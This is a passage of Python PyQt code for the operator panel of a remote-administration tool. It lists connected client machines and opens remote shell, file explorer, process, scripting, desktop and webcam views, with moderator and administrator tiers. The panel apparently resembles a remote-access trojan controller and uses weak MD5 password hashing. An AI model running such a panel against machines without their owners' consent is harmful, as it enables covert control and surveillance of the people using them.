                text, ok = QInputDialog.getText(self, _('UNLOCK_CLIENT'), _('ENTER_PASSWORD'), QLineEdit.Password)
                if ok:
                    _hash = hashlib.md5()
                    try:
                        _hash.update(str(text))
                        answer = data_get(self.connection_socket, _hash.hexdigest(), 'unlockClient', session_id=self.session_id, to=client)
                        if answer['mode'] == 'loginSuccess':
                            break
                        elif answer['mode'] == 'notAuthorized':
                            continue
                    except UnicodeEncodeError:
                        pass
                else:
                    break

    def lock_client(self):
        client = self.current_client()
        if client:
            data_send(self.connection_socket, 'lockClient', 'lockClient', self.session_id, client)

    def has_microphone(self):
        client = self.current_client()
        if client:
            if self.streaming_socks[client]['audio_device'] != 'NoDevice':
                return True
            else:
                return False

    def has_camera(self):
        client = self.current_client()
        if self.streaming_socks[client]['webcamera_device'] != 'NoDevice':
            return True
        else:
            return False

    def server_right_click_menu(self, point):
        server_index = self.clientsTable.currentRow()
        server_menu = QMenu(self)
        server_options_menu = QMenu(_('RM_CLIENT_OPTIONS'), self)
        server_options_menu.setIcon(QIcon(os.path.join(assets, 'settings.png')))

        if self.clientsTable.selectedItems():

            server_menu.addAction(QIcon(os.path.join(assets, 'add_alias.png')), _('RM_SET_ALIAS'), self.add_alias)
            server_menu.addAction(QIcon(os.path.join(assets, 'unhide.png')), _('RM_VIEW_LOGS'), self.view_logs)
            server_menu.addSeparator()

            if self.clientsTable.item(server_index, self.index_of_lock).text() == _('INFO_UNLOCKED'):
                server_menu.addAction(QIcon(os.path.join(assets, 'mshell.png')), _('RM_SHELL'),
                                      lambda: self.execute_module('shell'))
                server_menu.addAction(QIcon(os.path.join(assets, 'mexplorer.png')), _('RM_EXPLORER'),
                                      lambda: self.execute_module('explorer'))
                server_menu.addAction(QIcon(os.path.join(assets, 'mprocesses.png')), _('RM_PROCESSES'),
                                      lambda: self.execute_module('processes'))
                server_menu.addAction(QIcon(os.path.join(assets, 'script.png')), _('RM_SCRIPTING'),
                                      lambda: self.execute_module('scripting'))

                server_menu.addSeparator()
                server_menu.addMenu(server_options_menu)
                server_options_menu.addAction(QIcon(os.path.join(assets, 'lock.png')), _('RM_LOCK'),
                                              self.lock_client)
                if self.privs == 1:
                    server_options_menu.addAction(QIcon(os.path.join(assets, 'stop.png')), _('RM_TERMINATE'),
                                                  self.terminate_client)
            else:
                server_menu.addAction(QIcon(os.path.join(assets, 'unlock.png')), _('RM_UNLOCK'), self.unlock_client)

            server_menu.addSeparator()

            server_menu.addAction(QIcon(os.path.join(assets, 'mdesktop.png')),
                                  _('RM_DESKTOP'), self.get_desktop_preview)
            camera_menu = server_menu.addAction(QIcon(os.path.join(assets, 'webcam.png')),
                                                _('RM_CAMERA'), self.get_webcam_preview)
            if not self.has_camera():
                camera_menu.setEnabled(False)

            # Administrator Menu
            if self.privs == 1:
                server_menu.addSeparator()

                administrator_menu = QMenu(_('ADMINISTRATOR_RM_ADMINISTRATOR'), self)
                administrator_menu.setIcon(QIcon(os.path.join(assets, 'administration.png')))

                administrator_menu.addAction(QIcon(os.path.join(assets, 'add_alias.png')),
                                             _('ADMINISTRATOR_RM_SET_MODERATOR'), self.administrator_set_moderator)

                server_menu.addMenu(administrator_menu)

            server_menu.exec_(self.clientsTable.mapToGlobal(point))

    # get online client
    def current_client(self):
        try:
            return str(self.clientsTable.item(self.clientsTable.currentRow(), self.index_of_id).text())
        except AttributeError:
            return False

    # get offline client
    def current_offline_client(self):
        try:
            return str(self.offlineClientsTable.item(self.offlineClientsTable.currentRow(), 2).text())
        except AttributeError:
            return False

    def execute_module(self, module):
        modules = {
            'shell': mshell,
            'explorer': mexplorer,
            'scripting': mscript,
            'processes': mprocesses,
        }

        client = self.current_client()
        if client:
            args = {
                'sock': self.connection_socket,
                'client': client,
                'session_id': self.session_id,
                'assets': assets,
            }
            module_id = id_generator()
            if module in modules:
                self.modulesBank[module_id] = modules[module].mainPopup(args)
                self.modulesBank[module_id].show()

    def add_alias(self):
        client = self.current_client()
        if client:
            text, ok = QInputDialog.getText(self, _('ALIAS_SET'), _('ALIAS_NAME'))
            if ok:
                data_send(self.connection_socket, '%s %s' % (client, str(text)), 'setAlias', self.session_id)

    def terminate_client(self):
        client = self.current_client()
        if client:
            warn = QMessageBox(QMessageBox.Question, _('TERMINATE_CONFIRM'), _('TERMINATE_TEXT'))
            warn.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
            ans = warn.exec_()
            if ans == QMessageBox.Yes:
                data_send(self.connection_socket, 'terminateClient', 'terminateClient', session_id=self.session_id, to=client)

    def update_settings(self):
        self.settings = Config()
        self.IPADDRESS = self.settings.ip_address
        self.PORT = self.settings.port
        self.LANGUAGE = self.settings.language

    def run_settings(self):
        args = {
            'language': self.LANGUAGE
        }
        self.settings_form = Settings(args)
        self.settings_form.show()

    def administrator_set_moderator(self):
        client = self.current_client()
        if client:
            text, ok = QInputDialog.getText(self, _('SET_MODERATOR_TITLE'), _('SET_MODERATOR_USERNAME'), QLineEdit.Normal)
            if ok:
                data_send(self.connection_socket, '%s %s' % (client, text), 'setModerator', session_id=self.session_id)

    def closeEvent(self, event):
        self.acceptthreadState = False
        sys.exit(1)

    # MODERATORS COMMANDS
    def get_moderators(self):
        if self.privs == 1:
            try:
                all_moderators = data_get(self.connection_socket, 'getModerators', 'getModerators', session_id=self.session_id)
            except SyntaxError:
                return

            moderators = all_moderators['payload']
            self.moderatorsTable.setRowCount(len(moderators))

            for index, key in enumerate(moderators):

                # add moderator id
                item = QTableWidgetItem(key)
                item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
                self.moderatorsTable.setItem(index, 0, item)

                # add online clients count
                item = QTableWidgetItem(str(moderators[key]['online_clients']))
                item.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)
                self.moderatorsTable.setItem(index, 1, item)

                # add offline clients count
                item = QTableWidgetItem(str(moderators[key]['offline_clients']))
                item.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)
                self.moderatorsTable.setItem(index, 2, item)

                # add privileges
                privileges = moderators[key]['privileges']
                if privileges == 1:
                    color = '#9b59b6'
                    privileges = _('MODERATORS_PRIVILEGES_ADMINISTRATOR')
                else:
                    color = '#c9f5f7'
                    privileges = _('MODERATORS_PRIVILEGES_MODERATOR')
                item = QTableWidgetItem(privileges)
                item.setTextColor(QColor(color))
                item.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)
                self.moderatorsTable.setItem(index, 3, item)

                # add moderator status
                status = moderators[key]['status']
                if status == 1:
                    style = '#1abc9c'
                    text = _('MODERATOR_ONLINE')
                else:
                    style = '#e67e22'
                    text = _('MODERATOR_OFFLINE')
                item = QTableWidgetItem(text)
                item.setTextColor(QColor(style))
                item.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)
                self.moderatorsTable.setItem(index, 4, item)

                # add moderator last online
                item = QTableWidgetItem(str(moderators[key]['last_online']))
                item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
                self.moderatorsTable.setItem(index, 5, item)


    # Add Moderator Entry
    def add_moderator(self):
        # Get Username
        username, ok = QInputDialog.getText(self, _('ADMINISTRATION_INPUT_USERNAME'), _('ADMINISTRATION_USERNAME'), QLineEdit.Normal)
        if ok and len(str(username)) > 0:
            username = str(username)
            # Get Password
            password, ok = QInputDialog.getText(self, _('ADMINISTRATION_INPUT_PASSWORD'), _('ADMINISTRATION_PASSWORD'), QLineEdit.Password)
            if ok and len(str(password)) > 4:
                password = str(password)
                # Get Privileges
                privileges, ok = QInputDialog.getItem(self, _('ADMINISTRATION_INPUT_PRIVS'), _('ADMINISTRATION_PRIVS'), ('0', '1'), 0, False)
                admin = str(privileges)
                if ok and privileges:
                    # If everything ok
                    data_send(self.connection_socket, '%s %s %s' % (username, password, admin), 'addModerator', session_id=self.session_id)
                    # Update Moderators Table
                    self.get_moderators()
                else:
                    # If not privileges
                    warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_INCORRECT_PRIVILEGES'), _('ADMINISTRATION_INCORRECT_PRIVILEGES'))
                    ans = warn.exec_()
                    return
            # if not password
            else:
                warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_INCORRECT_PASSWORD'), _('ADMINISTRATION_INCORRECT_PASSWORD'))
                ans = warn.exec_()
                return
        # if not password
        else:
            warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_INCORRECT_USERNAME'), _('ADMINISTRATION_INCORRECT_USERNAME'))
            ans = warn.exec_()
            return


# Run Application
if __name__ == '__main__':
    app = QApplication(sys.argv)

    # Create and display the splash screen
    splash_pix = QPixmap(os.path.join(assets, 'splash.png'))
    splash = QSplashScreen(splash_pix, Qt.WindowStaysOnTopHint)
    splash.setMask(splash_pix.mask())
    splash.show()
    app.processEvents()
    time.sleep(3)

    form = MainDialog()
    splash.finish(form)
    form.show()

    sys.exit(app.exec_())
